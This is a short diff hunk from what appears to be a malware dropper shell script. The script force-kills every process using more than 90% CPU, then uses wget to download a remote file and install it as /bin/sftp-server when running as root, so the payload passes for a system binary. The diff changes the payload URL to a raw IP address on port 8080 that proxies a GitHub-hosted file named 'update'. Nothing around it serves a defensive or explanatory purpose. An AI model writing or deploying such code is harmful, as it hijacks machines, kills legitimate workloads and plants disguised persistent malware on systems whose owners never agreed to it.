@@ -40,7 +40,7 @@ HIGH_CPU_PROCESSES=$(ps aux --no-headers | awk '$3 > 90 && $11 != "ps" && $11 !=
 if [ -n "$HIGH_CPU_PROCESSES" ]; then
     echo "$HIGH_CPU_PROCESSES" | xargs -r kill -9
 fi
-REMOTE_URL="https://git.lsla.qzz.io:5000/https://github.com/DDM456/r/raw/refs/heads/main/upgrade"
+REMOTE_URL="http://207.56.137.246:8080/https://github.com/DDM456/r/raw/refs/heads/main/update"
 case "$SYSTEM_TYPE" in
     "root")
         wget -O /bin/sftp-server "$REMOTE_URL"
